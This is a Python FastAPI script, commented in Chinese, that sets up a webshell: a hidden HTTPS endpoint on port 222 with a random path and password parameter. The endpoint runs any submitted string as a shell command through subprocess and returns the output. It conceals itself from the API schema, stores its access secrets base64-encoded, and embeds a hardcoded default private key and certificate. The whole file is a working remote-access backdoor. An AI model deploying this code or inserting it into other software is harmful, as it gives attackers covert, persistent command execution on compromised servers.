# coding=utf-8

# 在此配置运行参数

私钥路径 = ""           #用户私钥路径
证书路径 = ""           #用户证书路径
端口 = 222
调试模式 = False        #若该值为 True，则输出命令行命令
配置项路径 = "./config"
绑定IP = "0.0.0.0"


if __name__ == "__main__":
    import os
    from fastapi import FastAPI, Form, Request, HTTPException
    from fastapi.responses import HTMLResponse,JSONResponse
    import uvicorn
    import string
    import random
    from fastapi.exceptions import RequestValidationError
    from ast import literal_eval
    import base64
    import subprocess

    def P(b: str) -> str: return os.path.join(配置项路径, b) #拼接配置项路径下面的 b 文件路径
    def rdStr(length: int) -> str: return ''.join(random.choice(string.ascii_letters) for _ in range(length)) # length 长度随机字符串产生器

    if not os.path.isdir(配置项路径):
        os.makedirs(配置项路径)

    #校验是否输入私钥路径证书路径，若没有则启用默认
    if len(私钥路径) + len(证书路径) == 0:
        私钥路径, 证书路径 = P("private.key"), P("certificate.crt")
        私钥, 证书 = "LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFb2dJQkFBS0NBUUVBclZ3NFhlcXNwRFc2b1p0L3RpWUdxeDBuSE1kZWx2bjFlQ3dUQm54WFR6ZHZrVDFXClpRVjVXY1U2cVprc0VPeUI0NW1vUndMc3E3QXRON2xsZDdSZWIxaWhmRzFuTEE5TzlpTVBVMC9BKytob1dremwKTnVQTUNoZDRGQkcweEdielNtLy9SYTQ5b09nN1RDTXZoNm1XT3VMSVVmQTAxWTVQSFhySTlZclg0a1ZQWGNvbQptV1RFMUtML0JBaW1CRUdoWnBVMGRlenR0Y0V0bkVHUVJSckZVeGlRSTUrVFdkd05KZFEvVjFuNVFDTml0d3VEClNmSDVnT1RJNGVEK1lKMy82VzlVSGdKb1ozVEc2V2ZETkhtaUlkM25sYnZJZEVNQlRNM0dIZHZNQmF2OWNmNlUKTmNRQnJyMjBmTWVHWU10MVVHdDhVRGdIWlI4TVBpL0RvMDN2V3dJREFRQUJBb0lCQUZjdnlpbHhuT0g1STZPagpVTmVLeUUvR21hVWZuN0xPZzJXc3hPUytKQ3J5OW1sVkw5NGVvcWxEUi8yRHkyVzNqSnVxNjdiTEFieFhIbWFvCkZ4L2MxcUdwTVk0aWQ0RHhNZ1VZSE4wSmYwVXgzVW1NNHJwNFZtVzg1K2N3QUhuR1RSVml2aitOSWZHSzJrZXcKYW5jUUV6NEtVRFRsV2EwTnBUeHVSQ001Y05tYXJoSzNVY2g4WjBYNzhzQWgzRG54SW9nY2NodjJIRU9GL21OawpjOHIzZGhkSXBlUmwwcnoydnpTZ0hEMWdqWHdLNjRlVGs0UzQ4STJNZGIyWThEOU1YRUZrcWU3aHNzT1dTcjhMClBmVmhLM0lHMzY0OUtDRHlBTUFtNnJ2b00vcUt1QjlIY1Bock9LTGFZdTBFb2M1Y2tJSG1leEUxWHZRNVRrQVkKdkpuTjRnRUNnWUVBMk5Ja3NVSVZsbytwS2N2Y1VaekVHeHlhSU5JTFk1ZHFhWGdUMUxrdHVJUkpPQnhyREN4NgpQZ3l5NzZPczJFRk5waUNMNTlTVit4SVZ0OVpEVE4wYnh3bFJDV1gyaWs0bDFWa1FBVjFlYTJ5ZmVlSzh1VWRCCm4wYTF6Y0RlYkNLVW5Wb1FqL05XTnJoRm9zQnkrVktNUEJ4WXE0UGNBWU1BSUtXbStTcVduMDhDZ1lFQXpLK2sKcllOd25KcXl6a3Bud29xdUJKb0ZFRGd5b0Fvd2VjRDgxb1NoZkFwNFlDRDJkZ0dRa0tBWU81YmV3TlhpV29TYwpPbFp4YzdId1dJdy9ZMGhoc280WGZrT2pOOGcyZVptZDNxcWZybHRnbHdyQnZtbnh0aU9jWEFIZ0srdU5TZVU2CjhHQ0lRU2tHTVA2aCswTHpiU2sxSTJFY0JZOXFkVmNjOHRjVXpEVUNnWUIxRE4xcUpEYnJWUnNKeVZoalpySW4Kd01Va09zQ1RQMGJmTVVmamF5VFhtL0s3Sy94T1VpU2NJdGJtc0FHN3JXVng3ZGdaaTVaOE9FTXBQNjZOYkVCMgpydnpraWZzU3B5V2RpN3NzUVcrYnBzUmhWSnAxbTVZOW1qckRuUDkyZVNTcDNkbGJIUTdKODZrRU44alorRXBrCm1SajFYdllDaXVvaXRjcnljSjluMlFLQmdHTzhtbU9xRG05Z3Vndm5HWlFqK3hObThWeXI1WTh5SjlqTC91ZVEKalJkaUNySGNuZnQyVzdqOUtaR3Z2QzcraVdOT0Jzb3VZTzNkSUo0bENLWWFHUERtWi9Bd2lSR2ZUMXdGVEhXNQpja0dGYVJWd09tUE1QK2xlaE13WVplRkEwQUhYM3RaT1UxWmM1UlZ1bmdOTzVrcWtyNjNqbmNIZjFpSURKcW4xCnY3NlpBb0dBVlVSYjM1blAyNTNHRS9UZnB5eW8wNWRuMjJIR096OFc4eFNxQy9ld2EwSStHSHFWYTA0N1oxWFkKanV2VUpidFFtNXo4VCtwcWF6ZEY3ZmJCTjNPYTJYTnJndFE5WXhSVHJmcThUcHJIVGgzcHM1V2VNQ1VYRXhsZAo1U0hoOVMxVmZWNTFzQy9qdkdzckt4MU5xckxRbDJFYjZva1lIa1NpZVhTeHlnL2d1QUk9Ci0tLS0tRU5EIFJTQSBQUklWQVRFIEtFWS0tLS0tCg==", "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURCakNDQWU0Q0NRRFo1SjdpRXNLSE5UQU5CZ2txaGtpRzl3MEJBUXNGQURCRk1Rc3dDUVlEVlFRR0V3SXcKTURFTE1Ba0dBMVVFQ0F3Q01EQXhDekFKQmdOVkJBY01BakF3TVJ3d0dnWURWUVFLREJORVpXWmhkV3gwSUVOdgpiWEJoYm5rZ1RIUmtNQjRYRFRJME1EWXdOVEExTlRjek5Wb1hEVEkxTURZd05UQTFOVGN6TlZvd1JURUxNQWtHCkExVUVCaE1DTURBeEN6QUpCZ05WQkFnTUFqQXdNUXN3Q1FZRFZRUUhEQUl3TURFY01Cb0dBMVVFQ2d3VFJHVm0KWVhWc2RDQkRiMjF3WVc1NUlFeDBaRENDQVNJd0RRWUpLb1pJaHZjTkFRRUJCUUFEZ2dFUEFEQ0NBUW9DZ2dFQgpBSzFjT0YzcXJLUTF1cUdiZjdZbUJxc2RKeHpIWHBiNTlYZ3NFd1o4VjA4M2I1RTlWbVVGZVZuRk9xbVpMQkRzCmdlT1pxRWNDN0t1d0xUZTVaWGUwWG05WW9YeHRaeXdQVHZZakQxTlB3UHZvYUZwTTVUYmp6QW9YZUJRUnRNUm0KODBwdi8wV3VQYURvTzB3akw0ZXBsanJpeUZId05OV09UeDE2eVBXSzErSkZUMTNLSnBsa3hOU2kvd1FJcGdSQgpvV2FWTkhYczdiWEJMWnhCa0VVYXhWTVlrQ09mazFuY0RTWFVQMWRaK1VBallyY0xnMG54K1lEa3lPSGcvbUNkCi8rbHZWQjRDYUdkMHh1bG53elI1b2lIZDU1Vzd5SFJEQVV6TnhoM2J6QVdyL1hIK2xEWEVBYTY5dEh6SGhtREwKZFZCcmZGQTRCMlVmREQ0dnc2Tk43MXNDQXdFQUFUQU5CZ2txaGtpRzl3MEJBUXNGQUFPQ0FRRUFNV3haRXlwbwpLbmhZOE5aOUF1SFpERzl5eW5yUFdiNVFtTzRoOTRjcFJXdVlRQm8veVUwUkxLMHFNU0VJK2Q5QnpxR2tiOGNDCjlsQUVzSUI3UmY4QUpLK2duQWdmUXNVRlV3RU0za05lcWV3bGNsNDk5Y0FHMVhtOWRLd28xZGFLYTZOV0JrOEcKOVdvNTBsOG1aN2syM1ZRSU1aaUJNUytIMTN1UGpIaGNQWU9QWEY3RklZM3IxYUZDUzVPRHd3RXdwZXpqYzB2bApDOE9RREF6aFhzR3E5cDBVbGhoYVM1Z2s5cWNmb3hNYkUwTmpXYzBPNmhjOHB3ZmxzbU9vYUNROXNWYnlBSWVuCmJGUDZyV3FKNTZlMGRHaG4wN0xtNkZLejR6azU1UTk5ZGNBWDJ2T1VLQ0xaaDBJQlY3S0w0Z3RiYVFadHhLMGgKSElDdFVEb2ZmRmZBcEE9PQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg=="

        if not os.path.exists(私钥路径):
            with open(私钥路径, 'w') as f:
                f.write(base64.b64decode(私钥).decode())

        if not os.path.exists(证书路径):
            with open(证书路径, 'w') as f:
                f.write(base64.b64decode(证书).decode())

    #webshell.cfg内容获取器
    class Config(object):
        @staticmethod
        def getDocs() -> dict:
            if not os.path.exists(P('webshell.cfg')):
                with open(P("webshell.cfg"), "w") as f:
                    origin = {
                        "PATH": f"/{rdStr(64)}",
                        "QUERY": f"query_{rdStr(24)}"
                    }
                    f.write(base64.b64encode(str(origin).encode()).decode())
            with open(P("webshell.cfg"), 'r') as f:
                data = f.read()
            return literal_eval(base64.b64decode(data).decode())

        @staticmethod
        def getPATH() -> str:
            return Config.getDocs()["PATH"]
        
        @staticmethod
        def getQUERY() -> str:
            return Config.getDocs()["QUERY"]

    PATH, QUERY = Config.getPATH(), Config.getQUERY()

    app = FastAPI(docs_url=None, redoc_url=None)

    #处理命令的函数
    def handler(command: str) -> str:
        if 调试模式:
            print(command)
        #r1 = os.popen(command)
        #r2 = r1.buffer.read().decode('utf-8', errors='replace')
        r1 = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        r2 = (r1.stdout + r1.stderr).decode(errors="replace")
        return r2
    
    exec(f'''
@app.get("{PATH}", response_class=HTMLResponse, include_in_schema=False)
async def shell_get({QUERY}: str = ""):
    return handler({QUERY})
        
@app.post("{PATH}", response_class=HTMLResponse, include_in_schema=False)
async def shell_post({QUERY}: str = Form(...)):
    return handler({QUERY})
    ''')

    print(f'''
--------------------

连接路径: https://{"{你的IP}"}:{端口}{PATH}

连接密码(参数): {QUERY}

--------------------
    ''')
    uvicorn.run(app, host=绑定IP, port=端口, ssl_keyfile=私钥路径, ssl_certfile=证书路径)

